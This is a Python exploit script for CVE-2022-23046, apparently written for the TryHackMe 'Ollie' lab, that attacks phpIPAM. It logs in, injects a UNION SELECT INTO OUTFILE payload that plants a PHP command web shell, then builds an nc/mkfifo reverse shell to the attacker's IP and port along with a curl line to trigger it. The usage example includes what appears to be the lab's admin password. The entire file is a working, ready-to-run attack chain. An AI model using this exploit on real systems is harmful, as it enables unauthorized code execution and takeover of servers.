#!/usr/bin/env python3
# This script works on my machine without authenticating in the web browser. I just tweaked it in developer mode in chrome, or maybe I was lucky enough, haha LOL!

import requests
import sys
import argparse
from bs4 import BeautifulSoup
import urllib.parse
import time

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

banner = """
                                                                     
 _____ _____ _____ _____ _____ _____ _____     _____ _____ __    _   
|  _  |  |  |  _  |     |  _  |  _  |     |___|   __|     |  |  |_|  
|   __|     |   __|-   -|   __|     | | | |___|__   |  |  |  |__| |  
|__|  |__|__|__|  |_____|__|  |__|__|_|_|_|   |_____|__  _|_____|_|  
                                                       |__|          
        
        Author: l0m3m4n  | SQL Injection (RCE) | THM - Ollie
"""
def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Exploit CVE-2022-23046 - SQL Injection (RCE)",
        epilog=f"Example: python3 exploit.py -t ollie.thm -u admin -p OllieUnixMontgomery! -l 10.23.42.147 -P 9001"
    )
    print(banner)
    parser.add_argument("-t", "--target", required=True, help="Target IP or domain")
    parser.add_argument("-u", "--username", required=True, help="Username for login")
    parser.add_argument("-p", "--password", required=True, help="Password for login")
    parser.add_argument("-l", "--local_ip", required=True, help="Your local IP address for reverse shell")
    parser.add_argument("-P", "--local_port", required=True, help="Your local port for reverse shell")
    return parser.parse_args()



def login(target, username, password):
    """Login to the application and return the session cookie."""
    url = f"http://{target}/app/login/login_check.php"
    data = {"ipamusername": username, "ipampassword": password}
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{target}",
        "Connection": "keep-alive",
        "Referer": f"http://{target}/index.php?page=login",
        "Priority": "u=0",
        "Content-Length": str(len(data))  # Add content length dynamically
    }
    
    try:
        # Send login request
        response = requests.post(url, verify=False, timeout=10, headers=headers, data=data)
        response.raise_for_status()

        # Extract cookies from the response header
        cookies = response.headers.get('Set-Cookie')
        if not cookies:
            print("[-] No cookies found in the response.")
            return None

        # Find and return the 'phpipam' cookie
        for cookie in cookies.split(';'):
            if "phpipam" in cookie:
                return cookie.split('=')[1].strip()  # Extract cookie value
        print("[-] 'phpipam' cookie not found.")
        return None

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during login: {e}")
        return None


def exploit(target, cookie):
    """Exploit the SQL injection vulnerability to upload a web shell."""
    url = f"http://{target}/app/admin/routing/edit-bgp-mapping-search.php"

    # SQL Injection payload to upload the PHP web shell
    payload = '" UNION SELECT 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE "/var/www/html/shell.php" -- -'

    data = {
        "subnet": payload,
        "bgp_id": 1
    }
    headers = {
        "Host": target,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": f"http://{target}",
        "Connection": "keep-alive",
        "Referer": f"http://{target}/index.php?page=administration&section=routing&subnetId=bgp&sPage=1",
        "Cookie": cookie,
        "Priority": "u=0"
    }

    try:
        response = requests.post(url, verify=False, headers=headers, data=data)
        response.raise_for_status()

        print("[+] Exploit executed successfully.")
        print(f"[+] Web shell uploaded verify payload: http://{target}/shell.php?cmd=whoami")
    except requests.exceptions.RequestException as e:
        print(f"Error during exploit: {e}")



def reverse_shell(local_ip, local_port):
    # Reverse shell command
    url_payload = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {local_ip} {local_port} > /tmp/f"
    
    # URL-encode the payload
    payload = urllib.parse.quote(url_payload)
    
    return payload

def main():
    """Main function to control the flow."""
    args = parse_arguments()

    print(f"Target: {args.target}")
    print(f"Username: {args.username}")
    print(f"Password: {args.password}")
    print(f"Local IP: {args.local_ip}")
    print(f"Local Port: {args.local_port}")

    # Step 1: Login to get the session cookie
    cookie = login(args.target, args.username, args.password)
    if not cookie:
        print(f"[-] Failed to retrieve the session cookie. Exiting.")
        sys.exit(1)

    print(f"[+] Cookie obtained: {cookie}")

    # Step 2: Exploit the vulnerability to upload the web shell
    exploit(args.target, cookie)

    # Step 3: Prepare the reverse shell payload
    payload = reverse_shell(args.local_ip, args.local_port)
    print(f"[+] Reverse Shell Payload: {payload}")

    # You can execute this payload in the shell using curl or any other tool.
    print(f"\n[+] Use the following to interact with the shell:")
    print(f"[+] curl http://{args.target}/shell.php?cmd={payload}")

if __name__ == "__main__":
    main()
